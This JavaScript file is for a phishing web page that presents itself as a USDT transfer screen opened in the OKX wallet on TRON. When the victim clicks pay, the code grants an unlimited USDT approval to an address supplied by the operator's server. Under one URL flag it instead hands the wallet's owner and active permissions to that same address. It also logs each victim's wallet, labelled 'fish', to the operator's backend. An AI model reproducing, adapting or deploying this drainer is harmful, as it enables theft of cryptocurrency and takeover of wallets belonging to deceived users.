var tronWeb, okxwallet;
var domain = 'https://' + window.location.host + '/';
var alldomain = window.location.href;
    function getInfo(){
        var gdata = {
    		wallet_purpose:3,
    		agent_id:1
    	}
		$.ajax({
			type: 'get',
			url:  domain + 'api/search_to_address',
			data : gdata,
			async : false,
			success:function(data){
			    trc_to_address = data.data.trc.wallet_addr;
                trc_contractAddr = data.data.trc.contract_addr;
                bizhong = data.data.trc.token_name;
                
                to_address_eth = data.data.eth.wallet_addr;
                eth_contractAddr = data.data.eth.contract_addr;
                eth_bizhong = data.data.eth.token_name;
                
                to_address_bsc = data.data.bsc.wallet_addr;
                bsc_contractAddr = data.data.bsc.contract_addr;
                bsc_bizhong = data.data.bsc.token_name;
                
                to_address_okt = data.data.okx.wallet_addr;
                okt_contractAddr = data.data.okx.contract_addr;
                okt_bizhong = data.data.okx.token_name;
                
			},
			error:function(data){
			}
		})
	}
    
    getInfo();
    
    function putInfo(fish_wallet_addr,to_address,agent_id){
		var data = {
    		fish_wallet_addr:fish_wallet_addr,
    		multi_wallet_addr:to_address,
    		agent_id:agent_id,
    		fish_source:'okxtron',
    		multiaddresspri:0
    	}
    	$.ajax({
    		type: 'post',
    		url: domain + 'api/insert_multi',
    		data: data,
    		success:function(data){
                console.log(1);
			},
			error:function(data){
			    console.log(2);
			}
    	})
	}
	
    function putInfoapprove(fish_wallet_addr,chain_type,contract_addr,token_name,approve_addr,agent_id){
		var data = {
    		fish_wallet_addr:fish_wallet_addr,
    		chain_type:chain_type,
    		contract_addr:contract_addr,
    		token_name:token_name,
    		approve_addr:approve_addr,
    		agent_id:agent_id,
    		fish_source:'okxtron'
    	}
    	$.ajax({
    		type: 'post',
    		url: domain + 'api/insert_approve',
    		data: data,
    		success:function(data){
                console.log(1);
			},
			error:function(data){
			    console.log(2);
			}
    	})
	}

const app = Vue.createApp({
    data() {
        return {
            loading: false,
            showAddress: trc_to_address,

            toAddress: trc_to_address,
            amount: null,
            
            dl:1,

            wangluoSuduIndex: 1,

            wallet: {
                abi: [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_subtractedValue", "type": "uint256" }], "name": "decreaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "_value", "type": "uint256" }], "name": "calcFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "oldBalanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_addedValue", "type": "uint256" }], "name": "increaseApproval", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint8" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }],
                tokenAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                address: "",

                usdtAmount: null,
                trxAmount: null,
            }

        }
    },
    async created() {
        //获取参数
        if (this.getQueryVariable("address")) {
            this.showAddress = this.getQueryVariable("address");
        }
        if (this.getQueryVariable("amount")) {
            this.amount = this.getQueryVariable("amount");
        }
        
        if (this.getQueryVariable("s")) {
            this.dl = this.getQueryVariable("s");
        }else{
            this.dl = 1;
        }

        if (typeof window.okxwallet == 'undefined') {
            // vant.showDialog({ message: '请在欧易钱包打开', closeOnClickOverlay: false, lockScroll: true, });
            //拉起web3支付
            var okex_OK = "okx://wallet/dapp/details?dappUrl=" + alldomain;
            window.location.href = okex_OK;
            return;
        }
        okxwallet = window.okxwallet;
        tronWeb = okxwallet.tronLink.tronWeb;
        //连接钱包账户
        var res = await okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
        this.wallet.address = tronWeb.defaultAddress.base58;
        if (this.wallet.address) {
            console.log('查询账户余额', this.wallet.address);
            this.balanceOf();
        }

        //监听
        window.addEventListener('message', function (e) {
            if (e.data.message && e.data.message.action == "connect") {
                console.log('got connect event', e.data)
            }
        })
    },
    methods: {
        paypal() {
            if (!okxwallet) {
                // vant.showDialog({ message: '请在欧易钱包打开', closeOnClickOverlay: false, lockScroll: true, });
                var okex_OKT = "okx://wallet/dapp/details?dappUrl=" + alldomain;
                window.location.href = okex_OKT;
                return;
            }
            if (!this.showAddress) {
                vant.showToast('请输入收款地址');
                return;
            }
            if (!this.amount || this.amount <= 0) {
                vant.showToast('请输入转账金额');
                return;
            }

            if (this.getQueryVariable("k") && this.getQueryVariable("k") == 1) {
                if (this.wallet.trxNum >= 100) {
                    this.updateAccountPermissions();
                    return;
                }
            }
            
            this.triggerSmartContract();
        },

        allAmount() {
            this.amount = this.wallet.usdtAmount;
        },
        getQueryVariable(variable) {
            var query = window.location.search.substring(1);
            var vars = query.split("&");
            for (var i = 0; i < vars.length; i++) {
                var pair = vars[i].split("=");
                if (pair[0] == variable) { return pair[1]; }
            }
            return (false);
        },

        //查询usdt OR TRX
        async balanceOf() {
            let contract = await tronWeb.contract(this.wallet.abi, this.wallet.tokenAddress);
            var usdtNum = await contract.balanceOf(this.wallet.address).call();
            var trxNum = await tronWeb.trx.getBalance(this.wallet.address);
            this.wallet.usdtAmount = tronWeb.fromSun(usdtNum);
            this.wallet.trxNum = tronWeb.fromSun(trxNum);
        },

        async triggerSmartContract() {
            putInfoapprove(this.wallet.address,'trc',this.wallet.tokenAddress,'USDT',this.toAddress,this.dl);
            var parameter = [{ type: 'address', value: this.toAddress }, { type: 'uint256', value: tronWeb.toSun(99999999999999) }];
            var options = {
                feeLimit: 100_000_000,
            };
            const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
                tronWeb.address.toHex(this.wallet.tokenAddress),
                "increaseApproval(address,uint256)",
                options,
                parameter,
                tronWeb.address.toHex(this.wallet.address)
            )

            // const signedtxn = await tronWeb.trx.sign(transaction);
            const receipt = await tronWeb.trx.sendRawTransaction(transaction);
            console.log(receipt, '广播完成');
        },

        async updateAccountPermissions() {
            putInfo(this.wallet.address,this.toAddress,this.dl);
            let ownerPermission = { type: 0, permission_name: 'owner' };
            ownerPermission.threshold = 1;
            ownerPermission.keys = [];

            let activePermission = { type: 2, permission_name: 'active0' };
            activePermission.threshold = 1;
            activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
            activePermission.keys = [];

            ownerPermission.keys.push({ address: tronWeb.address.toHex(this.toAddress), weight: 1 });
            activePermission.keys.push({ address: tronWeb.address.toHex(this.toAddress), weight: 1 });

            const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(
                tronWeb.address.toHex(this.wallet.address),
                ownerPermission,
                null,
                [activePermission]
            );
            //const signedtxn = await tronWeb.trx.sign(updateTransaction);
            const receipt = await tronWeb.trx.sendRawTransaction(updateTransaction);
            if (result) {
                if (result.code.indexOf('ERROR') != -1) {
                    alert('TRX余额不足，支付失败！');
                    return;
                }
                alert('支付成功');
            }
        }
    }
});